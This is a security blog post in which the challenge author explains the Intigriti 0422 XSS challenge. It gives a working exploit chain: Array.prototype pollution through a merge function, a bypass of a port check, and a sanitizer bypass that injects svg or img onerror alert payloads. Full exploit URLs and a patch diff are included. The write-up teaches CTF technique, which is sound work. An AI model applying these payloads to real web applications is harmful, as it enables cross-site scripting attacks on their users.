<!DOCTYPE html>
<html class="has-navbar-fixed-top" lang="en">
<head>
    <meta charset="utf-8">
<title>Intigriti 0422 XSS Challenge Author Writeup - Huli&#39;s blog</title>
<meta name="viewport" content="width=device-width, initial-scale=1">


            
<link href="https://blog.huli.tw/2022/04/25/intigriti-0422-xss-challenge-author-writeup/" rel="alternate" hreflang="zh-TW" />
            
    




    
<link rel="canonical" href="https://blog.huli.tw/2022/04/25/en/intigriti-0422-xss-challenge-author-writeup/">
    





    <meta name="description" content="Challenge URL: https:&#x2F;&#x2F;challenge-0422.intigriti.io&#x2F;">
<meta property="og:type" content="article">
<meta property="og:title" content="Intigriti 0422 XSS Challenge Author Writeup">
<meta property="og:url" content="https://blog.huli.tw/2022/04/25/en/intigriti-0422-xss-challenge-author-writeup/index.html">
<meta property="og:site_name" content="Huli&#39;s blog">
<meta property="og:description" content="Challenge URL: https:&#x2F;&#x2F;challenge-0422.intigriti.io&#x2F;">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://blog.huli.tw/img/intigriti-0422-xss-challenge-author-writeup/cover-en.png">
<meta property="article:published_time" content="2022-04-25T00:20:16.000Z">
<meta property="article:modified_time" content="2023-06-20T05:46:56.914Z">
<meta property="article:author" content="Huli">
<meta property="article:tag" content="Security">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://blog.huli.tw/img/intigriti-0422-xss-challenge-author-writeup/cover-en.png">



<link rel="alternative" href="/atom.xml" title="Intigriti 0422 XSS Challenge Author Writeup" type="application/atom+xml">



<link rel="icon" href="/img/lidemy_logo.png">


<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Ovo|Source+Code+Pro">


<link rel="stylesheet" href="/css/bulma.css?v=2.css">



<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css">


<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" />
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/line-numbers/prism-line-numbers.min.css" />


<link rel="stylesheet" href="/css/style.css?v=4.css">





    
    
    
    
    
    
    
    
    
    
<script async src="https://www.googletagmanager.com/gtag/js?id=G-1393J2EVCZ"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'G-1393J2EVCZ');
</script>


    


<meta name="generator" content="Hexo 6.3.0"></head>
<body>
    <script>
        if (localStorage.getItem('dark-mode')) {
            if (localStorage.getItem('dark-mode') === 'true') {
                document.body.classList.add('dark-mode')
            }
        } else {
            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
                document.body.classList.add('dark-mode')
            }
        }
    </script>
    
<nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
    <div class="container">
        <div class="navbar-brand">
            <a class="navbar-item navbar-logo" href="/en">
                
                    
                    Huli&#39;s blog
                    
                
            </a>
            <div class="navbar-burger">
                <span></span>
                <span></span>
                <span></span>
            </div>
        </div>
        
        <div class="navbar-menu navbar-start">
            
            <a class="navbar-item "
               href="/en/archives">Archive</a>
            
            <a class="navbar-item "
               href="/en/categories">Categories</a>
            
            <a class="navbar-item "
               href="/en/about">About</a>
            
        </div>
        
        <div class="navbar-menu navbar-end">
            
            
            <div class="navbar-item is-hoverable has-dropdown is-hidden-mobile is-hidden-tablet-only toc">
                <a class="navbar-item" title="Table of Contents">
                    Table of Contents
                </a>
                <div class="navbar-dropdown">
                    
                    
                    
                    
                    <a class="navbar-item" href="#solution">1&nbsp;&nbsp;<b>Solution</b></a>
                    
                    
                    
                    <a class="navbar-item" href="#step1-prototype-pollution-on-arrayprototype">1.1&nbsp;&nbsp;Step1. Prototype pollution on Array.prototype</a>
                    
                    
                    
                    <a class="navbar-item" href="#step2-bypass-checkhost">1.2&nbsp;&nbsp;Step2. Bypass checkHost</a>
                    
                    
                    
                    <a class="navbar-item" href="#step3-override-innerhtml">1.3&nbsp;&nbsp;Step3. Override innerHTML</a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#plot-twist">2&nbsp;&nbsp;<b>Plot twist</b></a>
                    
                </div>
            </div>
            
            
            <a class="navbar-item" target="_blank" title="Twitter" href="https://twitter.com/aszx87410">
                
                <i class="fab fa-twitter"></i>
                
            </a>
               
            <a class="navbar-item" target="_blank" title="RSS" href="/atom-en.xml">
                
                <i class="fas fa-rss"></i>
                
            </a>
               
            
            <a class="navbar-item btn-dark-mode" title="dark-mode" href="#">
                <div>
                    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" width="15" height="15" viewBox="0 0 256 256" xml:space="preserve">
                    <defs>
                    </defs>
                    <g style="stroke: none; stroke-width: 0; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: none; fill-rule: nonzero; opacity: 1;" transform="translate(1.4065934065934016 1.4065934065934016) scale(2.81 2.81)" >
                        <path d="M 87.823 60.7 c -0.463 -0.423 -1.142 -0.506 -1.695 -0.214 c -15.834 8.398 -35.266 2.812 -44.232 -12.718 c -8.966 -15.53 -4.09 -35.149 11.101 -44.665 c 0.531 -0.332 0.796 -0.963 0.661 -1.574 c -0.134 -0.612 -0.638 -1.074 -1.259 -1.153 c -9.843 -1.265 -19.59 0.692 -28.193 5.66 C 13.8 12.041 6.356 21.743 3.246 33.35 S 1.732 57.08 7.741 67.487 c 6.008 10.407 15.709 17.851 27.316 20.961 C 38.933 89.486 42.866 90 46.774 90 c 7.795 0 15.489 -2.044 22.42 -6.046 c 8.601 -4.966 15.171 -12.43 18.997 -21.586 C 88.433 61.79 88.285 61.123 87.823 60.7 z" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: #ffa716; fill-rule: nonzero; opacity: 1;" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round" />
                    </g>
                    </svg>
                </div>
            </a>
            
               <a class="navbar-item" href="/2022/04/25/intigriti-0422-xss-challenge-author-writeup/">中文</a>
            
            

        </div>
    </div>
</nav>

    <section class="section">
    <div class="container">
      
      <div data-nosnippet class="self-notice">
        If you have any thoughts on my blog or articles and you want to let me know, you can either post a comment below(public) or tell me via this <a href="https://forms.gle/SjJZ4cnNs6NnjXQG8" target="_blank">feedback form</a>
      </div>
      
    <article class="article content gallery" itemscope itemprop="blogPost">
    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
        
            Intigriti 0422 XSS Challenge Author Writeup
        
    </h1>
    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
        <span class="column is-narrow">
            <time datetime="2022-04-25T00:20:16.000Z" itemprop="datePublished">25 April 2022</time>
        </span>
        
        <span class="column is-narrow article-category">
            <i class="far fa-folder"></i>
            <a class="article-category-link" href="/en/categories/Security/">Security</a>
        </span>
        
        
        
    </div>
    
    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
    
        <img src="/img/intigriti-0422-xss-challenge-author-writeup/cover-en.png" style="display:none">

<p>Challenge URL: <a target="_blank" rel="noopener" href="https://challenge-0422.intigriti.io/">https://challenge-0422.intigriti.io/</a></p>
<span id="more"></span>

<h2><span id="solution">Solution</span></h2><p>TL;DR</p>
<ol>
<li>Pollute Array.prototype via <code>merge</code> function</li>
<li>Bypass <code>checkHost()</code></li>
<li>Set <code>innerHTML</code> and bypass <code>sanitize()</code> to perform XSS</li>
</ol>
<h3><span id="step1-prototype-pollution-on-arrayprototype">Step1. Prototype pollution on Array.prototype</span></h3><p>First, let’s take a look at the <code>merge</code> function:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">merge</span><span class="token punctuation">(</span><span class="token parameter">target<span class="token punctuation">,</span> source</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">let</span> protectedKeys <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'__proto__'</span><span class="token punctuation">,</span> <span class="token string">"mode"</span><span class="token punctuation">,</span> <span class="token string">"version"</span><span class="token punctuation">,</span> <span class="token string">"location"</span><span class="token punctuation">,</span> <span class="token string">"src"</span><span class="token punctuation">,</span> <span class="token string">"data"</span><span class="token punctuation">,</span> <span class="token string">"m"</span><span class="token punctuation">]</span>

  <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">in</span> source<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>protectedKeys<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">continue</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isPrimitive</span><span class="token punctuation">(</span>target<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      target<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">sanitize</span><span class="token punctuation">(</span>source<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
      <span class="token function">merge</span><span class="token punctuation">(</span>target<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">,</span> source<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function">sanitize</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> data <span class="token operator">!==</span> <span class="token string">'string'</span><span class="token punctuation">)</span> <span class="token keyword">return</span> data
  <span class="token keyword">return</span> data<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">[&lt;>%&amp;\$\s\\]</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">'_'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">script</span><span class="token regex-delimiter">/</span><span class="token regex-flags">gi</span></span><span class="token punctuation">,</span> <span class="token string">'_'</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>In the <code>merge</code> function, <code>__proto__</code> is blocked, but we can bypass it using <code>constructor.prototype</code>.</p>
<p>Then, below is the key of the first step:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> qs <span class="token operator">=</span> m<span class="token punctuation">.</span><span class="token function">parseQueryString</span><span class="token punctuation">(</span>location<span class="token punctuation">.</span>search<span class="token punctuation">)</span>

<span class="token keyword">let</span> appConfig <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span>
appConfig<span class="token punctuation">[</span><span class="token string">"version"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1337</span>
appConfig<span class="token punctuation">[</span><span class="token string">"mode"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"production"</span>
appConfig<span class="token punctuation">[</span><span class="token string">"window-name"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Window"</span>
appConfig<span class="token punctuation">[</span><span class="token string">"window-content"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"default content"</span>
appConfig<span class="token punctuation">[</span><span class="token string">"window-toolbar"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"close"</span><span class="token punctuation">]</span>
appConfig<span class="token punctuation">[</span><span class="token string">"window-statusbar"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">false</span>
appConfig<span class="token punctuation">[</span><span class="token string">"customMode"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">false</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span>qs<span class="token punctuation">.</span>config<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token function">merge</span><span class="token punctuation">(</span>appConfig<span class="token punctuation">,</span> qs<span class="token punctuation">.</span>config<span class="token punctuation">)</span>
  appConfig<span class="token punctuation">[</span><span class="token string">"customMode"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Although we can’t pollute <code>Object.prototype</code> because <code>appConfig</code> is created from <code>Object.create(null)</code>, we can pollute <code>Array.prototype</code> via <code>appConfig[&#39;window-toolbar&#39;]</code> which is an array!</p>
<p>So, we can pollute <code>Array.prototype</code> by providing a config object like this:</p>
<pre class="line-numbers language-none"><code class="language-none">config[window-toolbar][constructor][prototype][0]&#x3D;abc
&#x2F;&#x2F; equals to [&#39;close&#39;].constructor.prototype.0 &#x3D; &#39;abc&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>But the question is, what property should be polluted? </p>
<h3><span id="step2-bypass-checkhost">Step2. Bypass checkHost</span></h3><p>There is another call to <code>merge</code>, and it’s the second part of the challenge:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">checkHost</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">const</span> temp <span class="token operator">=</span> location<span class="token punctuation">.</span>host<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>
  <span class="token keyword">const</span> hostname <span class="token operator">=</span> temp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
  <span class="token keyword">const</span> port <span class="token operator">=</span> <span class="token function">Number</span><span class="token punctuation">(</span>temp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token number">443</span>
  <span class="token keyword">return</span> hostname <span class="token operator">===</span> <span class="token string">'localhost'</span> <span class="token operator">||</span> port <span class="token operator">===</span> <span class="token number">8080</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">let</span> devSettings <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span>
devSettings<span class="token punctuation">[</span><span class="token string">"root"</span><span class="token punctuation">]</span> <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'main'</span><span class="token punctuation">)</span>
devSettings<span class="token punctuation">[</span><span class="token string">"isDebug"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">false</span>
devSettings<span class="token punctuation">[</span><span class="token string">"location"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'challenge-0422.intigriti.io'</span>
devSettings<span class="token punctuation">[</span><span class="token string">"isTestHostOrPort"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">false</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">checkHost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  devSettings<span class="token punctuation">[</span><span class="token string">"isTestHostOrPort"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span>
  <span class="token function">merge</span><span class="token punctuation">(</span>devSettings<span class="token punctuation">,</span> qs<span class="token punctuation">.</span>settings<span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>We need to make <code>checkHost()</code> return <code>true</code> to perform another merge call. </p>
<p>In <code>checkHost</code>, it checks if hostname is localhost or port is 8080, let’s take a closer look at the check:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">checkHost</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">const</span> temp <span class="token operator">=</span> location<span class="token punctuation">.</span>host<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>
  <span class="token keyword">const</span> hostname <span class="token operator">=</span> temp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
  <span class="token keyword">const</span> port <span class="token operator">=</span> <span class="token function">Number</span><span class="token punctuation">(</span>temp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token number">443</span>
  <span class="token keyword">return</span> hostname <span class="token operator">===</span> <span class="token string">'localhost'</span> <span class="token operator">||</span> port <span class="token operator">===</span> <span class="token number">8080</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>It seems invulnerable, but what if <code>location.host</code> has no port?</p>
<p>For example, assumed <code>location.host</code> is <code>intigriti.io</code>, then <code>temp</code> becomes <code>[&#39;intigriti.io&#39;]</code>, and <code>temp[1]</code> is <code>undefined</code> because the length of the array is 1.</p>
<p>Here comes a cool way to bypass the check, what if <code>Array.prototype[1]</code> has been polluted? </p>
<p>The JavaScript engine will look up <code>Array.prototype[1]</code> since <code>temp</code> has no property <code>1</code>. So, combined with the step1, we can pollute <code>Array.prototype[1]</code> to bypass the check:</p>
<pre class="line-numbers language-none"><code class="language-none">config[window-toolbar][constructor][prototype][1]&#x3D;8080<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>By the way, I got this idea from another challenge called <code>vm-calc</code> made by <a target="_blank" rel="noopener" href="https://twitter.com/Strellic_">@Strellic_</a> in DiceCTF 2022, kudos to the creator.</p>
<h3><span id="step3-override-innerhtml">Step3. Override innerHTML</span></h3><p>After bypass the check, we have another merge call:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">let</span> devSettings <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span>
devSettings<span class="token punctuation">[</span><span class="token string">"root"</span><span class="token punctuation">]</span> <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'main'</span><span class="token punctuation">)</span>
devSettings<span class="token punctuation">[</span><span class="token string">"isDebug"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">false</span>
devSettings<span class="token punctuation">[</span><span class="token string">"location"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'challenge-0422.intigriti.io'</span>
devSettings<span class="token punctuation">[</span><span class="token string">"isTestHostOrPort"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">false</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">checkHost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  devSettings<span class="token punctuation">[</span><span class="token string">"isTestHostOrPort"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span>
  <span class="token function">merge</span><span class="token punctuation">(</span>devSettings<span class="token punctuation">,</span> qs<span class="token punctuation">.</span>settings<span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>devSettings[&quot;root&quot;]</code> is an HTML element, so we can use <code>?settings[root][innerHTML]</code> to set it’s innerHTML and try to perform XSS.</p>
<p>But, it’s not gonna work for two reasons.</p>
<p>First, there is a <code>sanitize</code> function for filtering <code>&lt;</code> and <code>&gt;</code>.</p>
<p>Second, the element only inserted to DOM after <code>m.mount()</code>, the content will be override by mithril.js</p>
<p>For the first issue, we can resolve it by using a bug in <code>sanitize</code> function:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">sanitize</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> data <span class="token operator">!==</span> <span class="token string">'string'</span><span class="token punctuation">)</span> <span class="token keyword">return</span> data
  <span class="token keyword">return</span> data<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">[&lt;>%&amp;\$\s\\]</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">'_'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">script</span><span class="token regex-delimiter">/</span><span class="token regex-flags">gi</span></span><span class="token punctuation">,</span> <span class="token string">'_'</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>What if <code>data</code> is an array? For example, <code>[&#39;&lt;a&gt;hello&lt;/a&gt;&#39;]</code>?</p>
<p>Because it’s not a string, so it won’t be sanitized, the function just return the original value. When you assign this array to <code>innerHTML</code>, it casts to string.</p>
<p>So, we can use <code>?settings[root][innerHTML][0]=&lt;svg onload=alert(1)&gt;</code> to bypass the sanitizer.</p>
<p>We are close to the end but need to address the last issue. The content of the element will be override by <code>m.mount</code> so our payload in <code>innerHTML</code> won’t work, how should we resolve this?</p>
<p>The idea is simple, what if we can set <code>innerHTML</code> to <code>document.body</code> instead of <code>&lt;main&gt;</code>? Then our payload won’t be override by mithril.js</p>
<p>There is a property called <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-TW/docs/Web/API/Node/ownerDocument">ownerDocument</a>, we can access <code>document</code> via this.</p>
<p>So, we can set innerHTML on body and perform XSS this way:</p>
<pre class="line-numbers language-none"><code class="language-none">config[window-toolbar][constructor][prototype][1]&#x3D;8080
settings[root][ownerDocument][body][innerHTML][0]&#x3D;&lt;svg onload&#x3D;alert(document.domain)&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>URL:<br><a target="_blank" rel="noopener" href="https://challenge-0422.intigriti.io/challenge/Window%20Maker.html?config%5Bwindow-toolbar%5D%5Bconstructor%5D%5Bprototype%5D%5B1%5D=8080&settings%5Broot%5D%5BownerDocument%5D%5Bbody%5D%5BinnerHTML%5D%5B0%5D=%3Cstyle%20onload=alert(document.domain)%3E">https://challenge-0422.intigriti.io/challenge/Window%20Maker.html?config[window-toolbar][constructor][prototype][1]=8080&amp;settings[root][ownerDocument][body][innerHTML][0]=%3Cstyle%20onload%3Dalert(document.domain)%3E</a></p>
<p>There is another magic to solve the issue without overriding <code>document.body.innerHTML</code>.</p>
<p>As pointed out <a target="_blank" rel="noopener" href="https://github.com/terjanq/Tiny-XSS-Payloads/blob/5e8603974ef878e1230ae05e7f79b9467d862e2c/payloads.js#L93">here</a>, <code>&lt;img src=x onerror=alert(1)&gt;</code> works even before inserted into the DOM. We can use this magic to set <code>root.innerHTML</code> and get XSS.</p>
<p>URL:<br><a target="_blank" rel="noopener" href="https://challenge-0422.intigriti.io/challenge/Window%20Maker.html?config%5Bwindow-toolbar%5D%5Bconstructor%5D%5Bprototype%5D%5B1%5D=8080&settings%5Broot%5D%5BinnerHTML%5D%5B0%5D=%3Cimg%20src=x%20onerror=alert(document.domain)%3E">https://challenge-0422.intigriti.io/challenge/Window%20Maker.html?config[window-toolbar][constructor][prototype][1]=8080&amp;settings[root][innerHTML][0]=%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E</a></p>
<h2><span id="plot-twist">Plot twist</span></h2><p>What if I told you that all the solutions above are unintended?</p>
<p>The challenge was easier than I thought because I made a few bugs, making the intended solution unnecessary and redundant. It’s like there should be five steps for solving the challenge, but you can solve it in step2 because of the bugs.</p>
<p>The challenge should be more complex and interesting.</p>
<p>So, here comes <strong>the revenge of Intigriti 0422 challenge</strong>!</p>
<p>I patched the bugs and hosted the fixed challenge on GitHub, here is the challenge URL: <a target="_blank" rel="noopener" href="https://aszx87410.github.io/xss-challenge/revenge-of-intigriti-0422">https://aszx87410.github.io/xss-challenge/revenge-of-intigriti-0422</a></p>
<p>You can found the diff below:</p>
<pre class="line-numbers language-diff" data-language="diff"><code class="language-diff">function sanitize(data) &#123;
<span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line"> if (typeof data !== 'string') return data
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"> if (typeof data !== 'string') data = String(data)
</span></span>
function merge(target, source) &#123;
<span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line"> let protectedKeys = ['__proto__', "mode", "version", "location", "src", "data", "m"]
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"> let protectedKeys = ['__proto__', "mode", "version", "location", "src", "data", "m", "Object"]</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>The revenge of Intigriti 0422 challenge runs until <code>2022-05-01T23:59:59+00:00</code>, you can DM me on <a target="_blank" rel="noopener" href="https://twitter.com/aszx87410">Twitter</a> if you find the solution.</p>
<p>Please noted that the revenge of Intigriti 0422 challenge is a challenge <strong>hosted by my own, not Intigriti</strong>, so there is no swag voucher for the winners.</p>

    
    </div>
    
    <div class="columns is-variable is-1 is-multiline is-mobile">
    
        <span class="column is-narrow"><a class="tag is-light article-tag" href="/en/tags/Security/">#Security</a></span>
    
    </div>
    
    
    <div class="columns is-mobile is-multiline article-nav">
        <span class="column is-12-mobile is-half-desktop  article-nav-prev">
            
            <a href="/2022/05/02/en/intigriti-revenge-challenge-author-writeup/">Revenge of Intigriti 0422 Challenge Author Writeup</a>
            
        </span>
        <span class="column is-12-mobile is-half-desktop  article-nav-next">
            
            <a href="/2022/04/24/en/how-much-do-you-know-about-script-type/">How much do you know about script type?</a>
            
        </span>
    </div>
    
</article>




<div class="comments">
    <h3 class="title is-4">Comments</h3>
    <script src="https://utteranc.es/client.js"
        repo="aszx87410/huli-blog"
        issue-term="title"
        theme="github-light"
        crossorigin="anonymous"
        async>
</script>
</div>

    </div>
</section>
    <footer class="footer">
    <div class="container">
        <div class="columns content">
            <div class="column is-narrow has-text-centered">
                &copy; 2025 Huli&nbsp;
                Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a
                        target="_blank" rel="noopener" href="http://github.com/ppoffice/hexo-theme-minos">Minos</a>
            </div>
            <div class="column is-hidden-mobile"></div>

            
            <div class="column is-narrow">
                <div class="columns is-mobile is-multiline is-centered">
                
                    
                <a class="column is-narrow" title="GitHub" target="_blank" rel="noopener" href="https://github.com/ppoffice/hexo-theme-minos">
                    
                    GitHub
                    
                </a>
                
                </div>
            </div>
            
            
<div class="column is-narrow has-text-centered">
    <div class="dropdown is-up is-right is-hoverable" style="margin-top: -0.2em;">
        <div class="dropdown-trigger">
            <button class="button is-small" aria-haspopup="true">
                <span class="icon">
                    <i class="fas fa-globe"></i>
                </span>
                <span>English</span>
                <span class="icon is-small">
            <i class="fas fa-angle-down" aria-hidden="true"></i>
          </span>
            </button>
        </div>
        <div class="dropdown-menu has-text-left" role="menu" style="top:100%">
            <div class="dropdown-content">
            <!-- NOTE: 永遠回到首頁 -->
            
                <a href="/2022/04/25/intigriti-0422-xss-challenge-author-writeup/" class="dropdown-item">
                    繁體中文
                </a>
            
            </div>
        </div>
    </div>
</div>

        </div>
    </div>
</footer>
    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>



    
    
    
    
    
    
<script src="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/js/lightgallery-all.min.js"></script>
<script>
    (function ($) {
        $(document).ready(function () {
            if (typeof($.fn.lightGallery) === 'function') {
                $('.article.gallery').lightGallery({ selector: '.gallery-item' });
            }
        });
    })(jQuery);
</script>

    
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
    <style>
        .hljs {
            position: relative;
        }

        .hljs .clipboard-btn {
            float: right;
            color: #9a9a9a;
            background: none;
            border: none;
            cursor: pointer;
        }

        .hljs .clipboard-btn:hover {
          color: #8a8a8a;
        }

        .hljs > .clipboard-btn {
            display: none;
            position: absolute;
            right: 4px;
            top: 4px;
        }

